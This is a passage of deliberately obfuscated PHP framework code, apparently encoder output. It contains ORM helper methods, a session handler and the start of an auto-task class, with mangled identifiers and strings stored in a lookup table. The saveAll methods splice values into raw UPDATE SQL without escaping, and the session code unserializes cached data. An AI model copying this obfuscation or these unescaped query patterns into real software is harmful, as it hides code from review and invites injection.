$Ôøƒî¦ª£÷Á· = null, $²À = null) { $ÄÜ„ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->tableMeta || !$’¬¬£Õ£¾) { return !1; } $»Á = $this->tableMeta[$ÄÜ„[369]]; $÷ã¥¦ù­ÔäĞ = $this->tableMeta[$ÄÜ„[370]]; $Ò¢ˆ×ù = Model($÷ã¥¦ù­ÔäĞ); $šö‡Åè·Åß¥ = array($»Á => $’¬¬£Õ£¾, $ÄÜ„[371] => $Ôøƒî¦ª£÷Á·); if (is_null($Ôøƒî¦ª£÷Á·)) { return $Ò¢ˆ×ù->where(array($»Á => $’¬¬£Õ£¾))->delete(); } if (is_null($²À) && is_string($Ôøƒî¦ª£÷Á·)) { return $Ò¢ˆ×ù->where($šö‡Åè·Åß¥)->delete(); } $³ñà†› = is_array($Ôøƒî¦ª£÷Á·) ? $Ôøƒî¦ª£÷Á· : array(); if (is_string($Ôøƒî¦ª£÷Á·)) { $³ñà†›[$Ôøƒî¦ª£÷Á·] = $²À; } $œé = array(); foreach ($³ñà†› as $¡³ÑË¤ú»Ù¾ => $Ì•Ÿ¶) { if (is_null($Ì•Ÿ¶) && is_string($¡³ÑË¤ú»Ù¾)) { $Ò¢ˆ×ù->where(array($»Á => $’¬¬£Õ£¾, $ÄÜ„[371] => $¡³ÑË¤ú»Ù¾))->delete(); continue; } $this->checkLength($Ì•Ÿ¶, !1, $÷ã¥¦ù­ÔäĞ . $ÄÜ„[4] . $¡³ÑË¤ú»Ù¾); $œé[] = array($»Á => $’¬¬£Õ£¾, $ÄÜ„[93] => $¡³ÑË¤ú»Ù¾, $ÄÜ„[372] => $Ì•Ÿ¶); } $š™ˆÅ = $ÄÜ„[373] . $÷ã¥¦ù­ÔäĞ; CacheLock::lock($š™ˆÅ); $Ò¢ˆ×ù->where(array($»Á => $’¬¬£Õ£¾))->addAll($œé, array(), !0); CacheLock::unlock($š™ˆÅ); return !0; } public function metaGet($ö±‡‹, $ÕÀ = false) { $’»Ô¯ÊÉÔ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->tableMeta) { return array(); } $â‹‚¼Óü¹Ê»ç = $this->tableMeta[$’»Ô¯ÊÉÔ[369]]; $µü§­Ÿ Àˆ = Model($this->tableMeta[$’»Ô¯ÊÉÔ[370]]); if ($ÕÀ) { $ûŠá¯Å± = array($â‹‚¼Óü¹Ê»ç => $ö±‡‹, $’»Ô¯ÊÉÔ[93] => $ÕÀ); return $µü§­Ÿ Àˆ->where($ûŠá¯Å±)->getField($’»Ô¯ÊÉÔ[372]); } $ûŠá¯Å± = array($â‹‚¼Óü¹Ê»ç => $ö±‡‹); $òÂ¢³ = $µü§­Ÿ Àˆ->field($’»Ô¯ÊÉÔ[374])->where($ûŠá¯Å±)->select(); $òÂ¢³ = array_to_keyvalue($òÂ¢³, $’»Ô¯ÊÉÔ[93], $’»Ô¯ÊÉÔ[372]); return $òÂ¢³; } private function checkDataAutoHas($“ğ‹Í) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $‘ìí—µ) { if (in_array($“ğ‹Í, explode($_SERVER[èÍ×öˆøÉ][47], $‘ìí—µ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$äë¿¹“ÊÈÖæ¸, $ñ‰‹) { $ñ† =& $_SERVER[èÍ×öˆøÉ]; foreach ($this->dataAuto as $–ÇğÖ¦—¤Ëš) { $Ş = $–ÇğÖ¦—¤Ëš[0]; if (!in_array($ñ‰‹, explode($ñ†[47], $–ÇğÖ¦—¤Ëš[2]))) { continue; } switch (trim($–ÇğÖ¦—¤Ëš[3])) { case $ñ†[319]: case $ñ†[320]: $–ê…§Î  = $–ÇğÖ¦—¤Ëš[1]; $ôÚîßñ¼÷ = isset($–ÇğÖ¦—¤Ëš[4]) ? (array) $–ÇğÖ¦—¤Ëš[4] : array(); if ($–ê…§Î  == $ñ†[197] && array_key_exists($Ş, $äë¿¹“ÊÈÖæ¸)) { if (!$äë¿¹“ÊÈÖæ¸[$Ş]) { unset($äë¿¹“ÊÈÖæ¸[$Ş]); } break; } if (isset($äë¿¹“ÊÈÖæ¸[$Ş])) { array_unshift($ôÚîßñ¼÷, $äë¿¹“ÊÈÖæ¸[$Ş]); } if ($ñ†[319] == $–ÇğÖ¦—¤Ëš[3]) { $äë¿¹“ÊÈÖæ¸[$Ş] = call_user_func_array($–ê…§Î , $ôÚîßñ¼÷); } else { $äë¿¹“ÊÈÖæ¸[$Ş] = call_user_func_array(array(&$this, $–ê…§Î ), $ôÚîßñ¼÷); } break; case $ñ†[268]: if (isset($äë¿¹“ÊÈÖæ¸[$Ş]) && $äë¿¹“ÊÈÖæ¸[$Ş]) { $äë¿¹“ÊÈÖæ¸[$Ş] = call_user_func_array(array(&$this, $–ÇğÖ¦—¤Ëš[1]), array($äë¿¹“ÊÈÖæ¸[$Ş])); } break; case $ñ†[271]: $äë¿¹“ÊÈÖæ¸[$Ş] = $äë¿¹“ÊÈÖæ¸[$–ÇğÖ¦—¤Ëš[1]]; break; case $ñ†[292]: if (isset($äë¿¹“ÊÈÖæ¸[$Ş]) && !is_string($äë¿¹“ÊÈÖæ¸[$Ş])) { $äë¿¹“ÊÈÖæ¸[$Ş] = json_encode_force($äë¿¹“ÊÈÖæ¸[$Ş]); } break; case $ñ†[321]: if ($äë¿¹“ÊÈÖæ¸[$Ş] === $ñ†[33]) { unset($äë¿¹“ÊÈÖæ¸[$Ş]); } break; case $ñ†[322]: $äë¿¹“ÊÈÖæ¸[$Ş] = $–ÇğÖ¦—¤Ëš[1]; default: break; } } if ($ñ‰‹ == $ñ†[353]) { $Îû¨æØÄü» = strtolower($this->db->getDbType()); if (strpos($Îû¨æØÄü», $ñ†[9]) !== 0) { return; } $İù³£ÈşÔè™ = $this->field(!0)->fields; $åÜµ‚€ = $İù³£ÈşÔè™[$ñ†[250]]; if (isset($İù³£ÈşÔè™[$ñ†[249]])) { unset($åÜµ‚€[$İù³£ÈşÔè™[$ñ†[249]]]); } foreach ($åÜµ‚€ as $î => $ñ‰‹) { if (!isset($äë¿¹“ÊÈÖæ¸[$î])) { $äë¿¹“ÊÈÖæ¸[$î] = $ñ†[33]; } } } } private function dataAfterFilter(&$‡ìôÑÉŞ¡û) { $Ø‚ =& $_SERVER[èÍ×öˆøÉ]; foreach ($this->dataAuto as $ığ¯ğ®ô÷¶) { $©…Ö€·š›œ = $ığ¯ğ®ô÷¶[0]; if (!isset($‡ìôÑÉŞ¡û[$©…Ö€·š›œ])) { continue; } if (!in_array($Ø‚[355], explode($Ø‚[47], $ığ¯ğ®ô÷¶[2]))) { continue; } switch (trim($ığ¯ğ®ô÷¶[3])) { case $Ø‚[319]: case $Ø‚[320]: $Ó¿áÎ¼ì›“ = isset($ığ¯ğ®ô÷¶[4]) ? (array) $ığ¯ğ®ô÷¶[4] : array(); array_unshift($Ó¿áÎ¼ì›“, $‡ìôÑÉŞ¡û[$©…Ö€·š›œ]); if (isset($ığ¯ğ®ô÷¶[4]) && $ığ¯ğ®ô÷¶[4] == $Ø‚[375]) { $Ó¿áÎ¼ì›“ = array($‡ìôÑÉŞ¡û[$©…Ö€·š›œ]); } if ($Ø‚[319] == $ığ¯ğ®ô÷¶[3]) { $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = call_user_func_array($ığ¯ğ®ô÷¶[1], $Ó¿áÎ¼ì›“); } else { $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = call_user_func_array(array(&$this, $ığ¯ğ®ô÷¶[1]), $Ó¿áÎ¼ì›“); } break; case $Ø‚[268]: if (isset($‡ìôÑÉŞ¡û[$©…Ö€·š›œ]) && $‡ìôÑÉŞ¡û[$©…Ö€·š›œ]) { $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = call_user_func_array(array(&$this, $ığ¯ğ®ô÷¶[1]), array($‡ìôÑÉŞ¡û[$©…Ö€·š›œ])); } break; case $Ø‚[271]: $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = $‡ìôÑÉŞ¡û[$ığ¯ğ®ô÷¶[1]]; break; case $Ø‚[292]: $ÔÏíûÅ = $‡ìôÑÉŞ¡û[$©…Ö€·š›œ]; $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = json_decode($ÔÏíûÅ, !0); if (is_null($‡ìôÑÉŞ¡û[$©…Ö€·š›œ])) { $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = $ÔÏíûÅ; } break; case $Ø‚[321]: if ($‡ìôÑÉŞ¡û[$©…Ö€·š›œ] === $Ø‚[33]) { unset($‡ìôÑÉŞ¡û[$©…Ö€·š›œ]); } break; case $Ø‚[322]: $‡ìôÑÉŞ¡û[$©…Ö€·š›œ] = $ığ¯ğ®ô÷¶[1]; break; default: break; } } } public function saveAll($¥’¡ ­İªœ) { $š‡äºÎ€× =& $_SERVER[èÍ×öˆøÉ]; $£Ë¶ = $this->tablePrefix . $this->tableName; $·¥å = self::SQL_WHERE_IN_CHUNK; $¥’¡ ­İªœ = is_array($¥’¡ ­İªœ) ? $¥’¡ ­İªœ : array(); $£œÅÇ³œ = $š‡äºÎ€×[376]; $—ÚÒâçª„ö = 0; $ÛÕ©Ø®è… = array(); $›½Øä‡ = count($¥’¡ ­İªœ); for ($›“·Àåó¼ = 0; $›“·Àåó¼ < $›½Øä‡; $›“·Àåó¼++) { $úÈ·— = $¥’¡ ­İªœ[$›“·Àåó¼]; if (!is_array($úÈ·—) || count($úÈ·—) != 4) { continue; } $ª•àÚ¤£ò· = "\125\120\x44\x41\124\105\x20\x60{$£Ë¶}\x60\x20\x53\x45\x54\x20{$úÈ·—[2]}\x20\75\40\103\101\x53\x45\x20{$úÈ·—[0]}\40\xa"; if ($—ÚÒâçª„ö == 0) { $£œÅÇ³œ = $ª•àÚ¤£ò·; } $ÛÕ©Ø®è…[] = $š‡äºÎ€×[116] . $úÈ·—[1] . $š‡äºÎ€×[116]; $—ÚÒâçª„ö++; $£œÅÇ³œ .= "\40\127\x48\x45\116\40\x27{$úÈ·—[1]}\47\x20\124\110\x45\x4e\x20\x27{$úÈ·—[3]}\47\40\xa"; if ($—ÚÒâçª„ö == $·¥å || $›“·Àåó¼ == $›½Øä‡ - 1) { $…Şıçô = implode($š‡äºÎ€×[47], $ÛÕ©Ø®è…); $£œÅÇ³œ .= "\40\105\x4e\x44\x20\40\x57\110\105\x52\105\40{$úÈ·—[0]}\x20\111\x4e\40\50{$…Şıçô}\51\x20"; $this->execute($£œÅÇ³œ); $—ÚÒâçª„ö = 0; $£œÅÇ³œ = $ª•àÚ¤£ò·; $this->chunkEventCheck(count($ÛÕ©Ø®è…)); $ÛÕ©Ø®è… = array(); } } $this->chunkEventSet(); } public function saveAllEach($İşöå) { $İÅ =& $_SERVER[èÍ×öˆøÉ]; $È’ = $this->tablePrefix . $this->tableName; foreach ($İşöå as $¡ì‡Ÿ“¬µ) { if (!is_array($¡ì‡Ÿ“¬µ) || count($¡ì‡Ÿ“¬µ) != 4) { continue; } $•‡ó«Û¿®óí® = $¡ì‡Ÿ“¬µ[0] . $İÅ[377] . $¡ì‡Ÿ“¬µ[1] . $İÅ[116]; $³š’ÔÒ“Åş = $¡ì‡Ÿ“¬µ[2] . $İÅ[377] . $¡ì‡Ÿ“¬µ[3] . $İÅ[116]; $…ú¤ = "\165\x70\144\141\x74\145\x20{$È’}\40\x73\145\164\x20{$³š’ÔÒ“Åş}\x20\x77\150\145\162\145\40{$•‡ó«Û¿®óí®}\73"; $this->execute($…ú¤); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¼œ = false, $¸ì = false) { $this->_chunkEvent = $¼œ; $this->_chunkEventParam = $¸ì; } private function chunkEventCheck($”œÎ‘) { if (!$this->_chunkEvent) { return; } $é•’öƒ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $é•’öƒ[$_SERVER[èÍ×öˆøÉ][378]] = $”œÎ‘; Hook::trigger($this->_chunkEvent, $é•’öƒ); } public function addAll($ìªë, $º³‰‰£÷ÆÉ = array(), $Ó˜ˆ– = false) { $ì˜ =& $_SERVER[èÍ×öˆøÉ]; ignore_timeout(); $†£´³’ÆÉ¶Ù— = self::SQL_WHERE_IN_CHUNK; if (empty($ìªë)) { $this->error = think_lang($ì˜[269]); return !1; } $º³‰‰£÷ÆÉ = $this->_parseOptions($º³‰‰£÷ÆÉ); foreach ($ìªë as $ôÎÛ => $óÛîë) { $ìªë[$ôÎÛ] = $this->_facade($óÛîë); $this->_beforeInsert($ìªë[$ôÎÛ], $º³‰‰£÷ÆÉ); } if (method_exists($this->db, $ì˜[270])) { for ($±ôÅ = 0; $±ôÅ < count($ìªë); $±ôÅ += $†£´³’ÆÉ¶Ù—) { $éó = array_slice($ìªë, $±ôÅ, $†£´³’ÆÉ¶Ù—); if (!is_array($éó) || count($éó) == 0) { break; } $Û÷£–¸Ï‹€ = $this->db->insertAll($éó, $º³‰‰£÷ÆÉ, $Ó˜ˆ–); $this->chunkEventCheck(count($éó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ìªë as $ôÎÛ => $óÛîë) { $Û÷£–¸Ï‹€ = $this->db->insert($óÛîë, $º³‰‰£÷ÆÉ, $Ó˜ˆ–); } $this->commit(); } if (!1 !== $Û÷£–¸Ï‹€) { $ˆ¯ïŸ»æº˜—õ = $this->getLastInsID(); if ($ˆ¯ïŸ»æº˜—õ) { return $ˆ¯ïŸ»æº˜—õ; } } return $Û÷£–¸Ï‹€; } public function save($¹±Ğ– «æ = '', $³Ó”ÔÔŞ²¿ = array()) { $û =& $_SERVER[èÍ×öˆøÉ]; $²ò‡ßÅ = self::SQL_WHERE_IN_CHUNK; $Î£Ÿá¡¢ = $this->optionsValue(); $º² = $this->findWhereField($Î£Ÿá¡¢); if (!$º²) { return parent::save($¹±Ğ– «æ, $³Ó”ÔÔŞ²¿); } $±¿Ó = 0; $ƒˆÊÌ = $Î£Ÿá¡¢[$û[273]][$º²][1]; $ƒˆÊÌ = is_array($ƒˆÊÌ) ? $ƒˆÊÌ : array(); $õ°Ì×–ßÛåÂ¸ = count($ƒˆÊÌ); for ($ öË™‡‚—Ã = 0; $ öË™‡‚—Ã < $õ°Ì×–ßÛåÂ¸; $ öË™‡‚—Ã += $²ò‡ßÅ) { $ˆü¬ƒ»çİŒÆ’ = array_slice($ƒˆÊÌ, $ öË™‡‚—Ã, $²ò‡ßÅ); if (!is_array($ˆü¬ƒ»çİŒÆ’) || count($ˆü¬ƒ»çİŒÆ’) == 0) { break; } $Î£Ÿá¡¢[$û[273]][$º²][1] = $ˆü¬ƒ»çİŒÆ’; $this->optionsValue($Î£Ÿá¡¢); $±¿Ó += parent::save($¹±Ğ– «æ, $³Ó”ÔÔŞ²¿); $this->chunkEventCheck(count($ˆü¬ƒ»çİŒÆ’)); } $this->chunkEventSet(); return $±¿Ó; } public function add($—ĞŞ· = '', $Ü£àâŸ’êá = array(), $üåé°ëŒ¬ = false) { if ($this->addTaskStatus && is_array($—ĞŞ·)) { $this->addTaskData[] = $—ĞŞ·; return; } return parent::add($—ĞŞ·, $Ü£àâŸ’êá, $üåé°ëŒ¬); } public function parseWhereLike($‰Œ, $Ñ¾…â = '', $à = false, &$Ó = false) { $›ãˆ =& $_SERVER[èÍ×öˆøÉ]; $€è§‡ = $GLOBALS[$›ãˆ[6]][$›ãˆ[379]]; if (!$€è§‡[$›ãˆ[380]]) { return $‰Œ; } if (!is_array($‰Œ)) { return $‰Œ; } $îœ¤æ› = array(); $Û›ı©İ¼ÃšĞ = 0; foreach ($‰Œ as $ˆÛ‘Ğ•ú¢ò => $²µ…ãŸàĞ€Í) { if (is_array($²µ…ãŸàĞ€Í) && count($²µ…ãŸàĞ€Í) == 2 && $²µ…ãŸàĞ€Í[0] == $›ãˆ[381] && is_string($²µ…ãŸàĞ€Í[1]) && substr($²µ…ãŸàĞ€Í[1], 0, 1) == $›ãˆ[382] && substr($²µ…ãŸàĞ€Í[1], strlen($²µ…ãŸàĞ€Í[1]) - 1, 1) == $›ãˆ[382]) { $Ó = !0; $ñÆà²Åè¢ş = is_string($ˆÛ‘Ğ•ú¢ò) ? $ˆÛ‘Ğ•ú¢ò : $Ñ¾…â; $ˆÀÑ = substr($²µ…ãŸàĞ€Í[1], 1, strlen($²µ…ãŸàĞ€Í[1]) - 2); $ˆÀÑ = $this->db->escapeString($ˆÀÑ); if (!strpos($ñÆà²Åè¢ş, $›ãˆ[95])) { $ñÆà²Åè¢ş = $›ãˆ[383] . $ñÆà²Åè¢ş . $›ãˆ[383]; } $ù“ = $›ãˆ[182] . $ˆÀÑ . $›ãˆ[182]; if ($€è§‡[$›ãˆ[384]]) { $ù“ = $›ãˆ[385] . $ˆÀÑ . $›ãˆ[386]; if ($€è§‡[$›ãˆ[387]]) { $ù“ = $›ãˆ[386] . $ˆÀÑ . $›ãˆ[385]; } } $îœ¤æ›[$Û›ı©İ¼ÃšĞ] = $›ãˆ[388] . $ñÆà²Åè¢ş . $›ãˆ[389] . $ù“ . $›ãˆ[390]; $Û›ı©İ¼ÃšĞ++; continue; } if (is_array($²µ…ãŸàĞ€Í)) { $Ñ¾…â = is_string($ˆÛ‘Ğ•ú¢ò) ? $ˆÛ‘Ğ•ú¢ò : $Ñ¾…â; $²µ…ãŸàĞ€Í = $this->parseWhereLike($²µ…ãŸàĞ€Í, $Ñ¾…â, !0, $Ó); } if (is_numeric($ˆÛ‘Ğ•ú¢ò)) { $îœ¤æ›[$Û›ı©İ¼ÃšĞ] = $²µ…ãŸàĞ€Í; $Û›ı©İ¼ÃšĞ++; } else { $îœ¤æ›[$ˆÛ‘Ğ•ú¢ò] = $²µ…ãŸàĞ€Í; } } if ($Ó && !$à) { } return $îœ¤æ›; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($†ÁÍ„Ø€¬É¿ = array()) { $¬½†—ö†Ãâøç =& $_SERVER[èÍ×öˆøÉ]; $ö‚Ú›ì— = self::SQL_WHERE_IN_CHUNK; $¡’”˜ü = $this->optionsValue(); $—•Éì° ü¬ = $this->findWhereField($¡’”˜ü); if (!$—•Éì° ü¬ || isset($¡’”˜ü[$¬½†—ö†Ãâøç[290]]) || isset($¡’”˜ü[$¬½†—ö†Ãâøç[351]])) { return parent::select($†ÁÍ„Ø€¬É¿); } $Ïò–‹ğŞ¨ğ = $¡’”˜ü[$¬½†—ö†Ãâøç[273]][$—•Éì° ü¬][1]; $Ïò–‹ğŞ¨ğ = is_array($Ïò–‹ğŞ¨ğ) ? $Ïò–‹ğŞ¨ğ : array(); $¦ğ— = null; for ($Æ¥â¿»ó†ö = 0; $Æ¥â¿»ó†ö < count($Ïò–‹ğŞ¨ğ); $Æ¥â¿»ó†ö += $ö‚Ú›ì—) { $˜Â¼…¸« = array_slice($Ïò–‹ğŞ¨ğ, $Æ¥â¿»ó†ö, $ö‚Ú›ì—); if (!is_array($˜Â¼…¸«) || count($˜Â¼…¸«) == 0) { break; } $¡’”˜ü[$¬½†—ö†Ãâøç[273]][$—•Éì° ü¬][1] = $˜Â¼…¸«; $this->optionsValue($¡’”˜ü); $ŠıïûİÜ§Ú = parent::select($†ÁÍ„Ø€¬É¿); if (!$ŠıïûİÜ§Ú) { continue; } $¦ğ— = is_array($¦ğ—) ? $¦ğ— : array(); $¦ğ— = array_merge($¦ğ—, $ŠıïûİÜ§Ú); } return $¦ğ—; } public function delete($™••‰ = array()) { $¾£ =& $_SERVER[èÍ×öˆøÉ]; $ˆÊüş = self::SQL_WHERE_IN_CHUNK; $åÇ«ë£ÇúÆµ = $this->optionsValue(); $‚Ó³Ô Ş = $this->findWhereField($åÇ«ë£ÇúÆµ); if (!$‚Ó³Ô Ş) { return parent::delete($™••‰); } $é” = 0; $Êì = $åÇ«ë£ÇúÆµ[$¾£[273]][$‚Ó³Ô Ş][1]; $Êì = is_array($Êì) ? $Êì : array(); for ($ÅäÁş = 0; $ÅäÁş < count($Êì); $ÅäÁş += $ˆÊüş) { $¼‘·Ì·Ø = array_slice($Êì, $ÅäÁş, $ˆÊüş); if (!is_array($¼‘·Ì·Ø) || count($¼‘·Ì·Ø) == 0) { break; } $åÇ«ë£ÇúÆµ[$¾£[273]][$‚Ó³Ô Ş][1] = $¼‘·Ì·Ø; $this->optionsValue($åÇ«ë£ÇúÆµ); $é” += parent::delete($™••‰); } return $é”; } private function findWhereField($¤µÅ¾‹Ó•¹€¬) { $àÕ¹‡¦ =& $_SERVER[èÍ×öˆøÉ]; $¼“Ãê† = self::SQL_WHERE_IN_CHUNK; if (!is_array($¤µÅ¾‹Ó•¹€¬) || !is_array($¤µÅ¾‹Ó•¹€¬[$àÕ¹‡¦[273]])) { return !1; } foreach ($¤µÅ¾‹Ó•¹€¬[$àÕ¹‡¦[273]] as $ĞçÇÜ£ => $…û) { if (is_array($…û) && isset($…û[0]) && is_string($…û[0]) && strtolower($…û[0]) == $àÕ¹‡¦[7] && is_array($…û[1]) && count($…û[1]) > $¼“Ãê†) { ignore_timeout(); return $ĞçÇÜ£; } } return !1; } public function setMasterDB($ç©Å = true) { think_config($_SERVER[èÍ×öˆøÉ][391], $ç©Å); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\155\x4f\x70\164\151\x6f\x6e"; public $field = array(); public function listData($÷ÎÖ«Ñ¡Ğ¼ç = false, $íûÄ Òä = "\155\157\x64\151\146\171\124\151\155\145", $§†™û = false) { $¼Ëêæµ«Úñë = Model($this->modelType)->get(!1, $this->optionType, !0); $§ì€•Ò˜²÷×¾ = array_values($¼Ëêæµ«Úñë); if ($§ì€•Ò˜²÷×¾ && $§ì€•Ò˜²÷×¾[0] && !is_array($§ì€•Ò˜²÷×¾[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¼Ëêæµ«Úñë = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¼Ëêæµ«Úñë) { return $÷ÎÖ«Ñ¡Ğ¼ç ? null : array(); } if (!$÷ÎÖ«Ñ¡Ğ¼ç) { $¼Ëêæµ«Úñë = array_filter(array_values($¼Ëêæµ«Úñë)); return array_sort_by($¼Ëêæµ«Úñë, $íûÄ Òä, $§†™û); } return $¼Ëêæµ«Úñë[$_SERVER[èÍ×öˆøÉ][392] . $÷ÎÖ«Ñ¡Ğ¼ç]; } public function insert($Š¯Áòêä) { $¾îØ‰Ù =& $_SERVER[èÍ×öˆøÉ]; $Š¯Áòêä = array_field_key($Š¯Áòêä, $this->field); $ù = Model($this->modelType)->get($¾îØ‰Ù[393], $this->optionType . $¾îØ‰Ù[394]); $ù = $ù ? $ù : 0; $Š¯Áòêä[$¾îØ‰Ù[395]] = ++$ù; $Š¯Áòêä[$¾îØ‰Ù[194]] = time(); $Š¯Áòêä[$¾îØ‰Ù[84]] = time(); Model($this->modelType)->set($¾îØ‰Ù[393], $ù, $this->optionType . $¾îØ‰Ù[394]); Model($this->modelType)->set($¾îØ‰Ù[392] . $ù, $Š¯Áòêä, $this->optionType); return $ù; } public function update($Ê¥¸‡ıÜî, $¯ã‰Ğå) { $ùñ§Â»Ûš =& $_SERVER[èÍ×öˆøÉ]; $¯ã‰Ğå = array_field_key($¯ã‰Ğå, $this->field); $…Ëƒ­ = $this->listData($Ê¥¸‡ıÜî); if (!$…Ëƒ­ || !$Ê¥¸‡ıÜî) { return !1; } $¯ã‰Ğå = array_merge($…Ëƒ­, $¯ã‰Ğå); $¯ã‰Ğå[$ùñ§Â»Ûš[84]] = time(); return Model($this->modelType)->set($ùñ§Â»Ûš[392] . $Ê¥¸‡ıÜî, $¯ã‰Ğå, $this->optionType); } public function remove($’æìı–¤ßí) { if (!$’æìı–¤ßí) { return !1; } return Model($this->modelType)->remove($_SERVER[èÍ×öˆøÉ][392] . $’æìı–¤ßí, $this->optionType); } public function clear() { $Úš =& $_SERVER[èÍ×öˆøÉ]; Model($this->modelType)->remove($Úš[393], $this->optionType . $Úš[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($«, $˜íœèÊ) { if (!$˜íœèÊ) { return !1; } $ÑáÙíš²“ = $this->listData(); $ÑáÙíš²“ = array_to_keyvalue($ÑáÙíš²“, $«); return isset($ÑáÙíš²“[$˜íœèÊ]) ? $ÑáÙíš²“[$˜íœèÊ] : !1; } public function findByName($İòİ½½Ûëû–) { return $this->findByKey($_SERVER[èÍ×öˆøÉ][28], $İòİ½½Ûëû–); } protected function resetData($İüç¦£ñŸ¹) { $”İ =& $_SERVER[èÍ×öˆøÉ]; $İüç¦£ñŸ¹ = is_array($İüç¦£ñŸ¹) ? $İüç¦£ñŸ¹ : array(); $¦ = array(); for ($ËÈ„á›òÅ¼ = 0; $ËÈ„á›òÅ¼ < count($İüç¦£ñŸ¹); $ËÈ„á›òÅ¼++) { $¦[$”İ[392] . $İüç¦£ñŸ¹[$ËÈ„á›òÅ¼][$”İ[395]]] = $İüç¦£ñŸ¹[$ËÈ„á›òÅ¼]; } return Model($this->modelType)->set($¦, !1, $this->optionType); } private function getAutoName($’õï²ä¼¶Æ) { $ò«°Ô¸áÊáš = array_to_keyvalue($this->listData(), $_SERVER[èÍ×öˆøÉ][28]); if (!$ò«°Ô¸áÊáš || !isset($ò«°Ô¸áÊáš[$’õï²ä¼¶Æ])) { return $’õï²ä¼¶Æ; } for ($æ• = 1; $æ• < count($ò«°Ô¸áÊáš); $æ•++) { $ÒÚå¢µ¨Åê°ı = $’õï²ä¼¶Æ . "\x28{$æ•}\51"; if (!isset($ò«°Ô¸áÊáš[$ÒÚå¢µ¨Åê°ı])) { return $ÒÚå¢µ¨Åê°ı; } } return $ÒÚå¢µ¨Åê°ı; } } goto CğÄÛÆ¢³£; cåë˜áÃŠ¨: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $§—Ùî£“ =& $_SERVER[èÍ×öˆøÉ]; static $«¡»õÛ¢İÄ = false; if ($«¡»õÛ¢İÄ) { return $«¡»õÛ¢İÄ; } $•ù¨×ÔôÖêÔ = $GLOBALS[$§—Ùî£“[6]][$§—Ùî£“[347]]; self::$sessionTime = $•ù¨×ÔôÖêÔ[$§—Ùî£“[1541]]; $ğŞëçª = isset($GLOBALS[$§—Ùî£“[1542]]) ? $GLOBALS[$§—Ùî£“[1542]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ğŞëçª)) { self::$sessionSign = Cookie::get($ğŞëçª); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ğŞëçª, self::$sessionSign, self::$sessionTime); $¶àø‚Ê¢ = $•ù¨×ÔôÖêÔ[$§—Ùî£“[1543]]; $Ó›Ì„ = $•ù¨×ÔôÖêÔ[$¶àø‚Ê¢]; $Ñ¥ñ› = $•ù¨×ÔôÖêÔ[$§—Ùî£“[830]]; switch ($¶àø‚Ê¢) { case $§—Ùî£“[17]: self::$handle = Model($§—Ùî£“[831]); break; case $§—Ùî£“[832]: self::$handle = new CacheRedis($Ó›Ì„, $Ñ¥ñ›); break; case $§—Ùî£“[833]: self::$handle = new CacheMemcached($Ó›Ì„, $Ñ¥ñ›); break; case $§—Ùî£“[193]: $Ó›Ì„[$§—Ùî£“[76]] = $Ó›Ì„[$§—Ùî£“[76]] . $§—Ùî£“[1544]; self::$handle = new CacheFile($Ó›Ì„, $Ñ¥ñ›); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $«¡»õÛ¢İÄ = new self(); return $«¡»õÛ¢İÄ; } public static function getBySign($Ôù²•…¯¤©) { CacheLock::lock($Ôù²•…¯¤©); $€ë’Ä = self::$handle->get($Ôù²•…¯¤©); CacheLock::unlock($Ôù²•…¯¤©); $€ë’Ä = unserialize($€ë’Ä); return is_array($€ë’Ä) ? $€ë’Ä : array(); } public static function setBySign($ŞÒÅÛ–¸”´, $ï©îÏÉ) { CacheLock::lock($ŞÒÅÛ–¸”´); self::$handle->set($ŞÒÅÛ–¸”´, serialize($ï©îÏÉ), self::$sessionTime); CacheLock::unlock($ŞÒÅÛ–¸”´); } public static function sign($Œ = false) { $Œ && (self::$sessionSign = $Œ); self::init(); return self::$sessionSign; } public static function set($¬ó, $ÆÜò = false) { self::init(); if (is_array($¬ó)) { foreach ($¬ó as $Âî£Û„– => $Óë³ÈÏ«ß–©) { array_set_value(self::$data, $Âî£Û„–, $Óë³ÈÏ«ß–©); } } else { array_set_value(self::$data, $¬ó, $ÆÜò); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ã¨Ò¿Ñó¥ = false) { self::init(); if (!$ã¨Ò¿Ñó¥) { return self::$data; } return array_get_value(self::$data, $ã¨Ò¿Ñó¥); } public static function remove($ˆ—å­º¦„µ) { self::init(); unset(self::$data[$ˆ—å­º¦„µ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[èÍ×öˆøÉ][835])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ôıöµ……ºÑ =& $_SERVER[èÍ×öˆøÉ]; if (self::valueGet($ôıöµ……ºÑ[745]) != $ôıöµ……ºÑ[87]) { return; } if (self::valueGet($ôıöµ……ºÑ[1545]) == $ôıöµ……ºÑ[87]) { $òÉ»Ÿ = 